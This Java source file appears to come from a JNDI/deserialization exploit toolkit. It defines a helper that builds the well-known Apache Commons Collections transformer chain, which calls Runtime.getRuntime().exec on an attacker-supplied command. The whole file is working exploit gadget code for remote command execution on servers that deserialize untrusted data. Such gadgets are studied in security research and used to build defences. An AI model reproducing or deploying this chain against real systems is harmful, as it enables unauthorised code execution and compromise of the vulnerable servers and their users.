package com.nu1r.jndi.gadgets.utils.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.script.ScriptEngineManager;
import java.io.FileOutputStream;
import java.net.URL;
import java.net.URLClassLoader;

import static com.nu1r.jndi.gadgets.utils.Utils.base64Decode;

public class TransformerUtil {

    public static Transformer[] makeTransformer(String command) throws Exception {
        Transformer[] transformers;
        String[]      execArgs = {command};
        transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, (Object[]) execArgs), new ConstantTransformer(Integer.valueOf(1))};
        return transformers;
    }

}
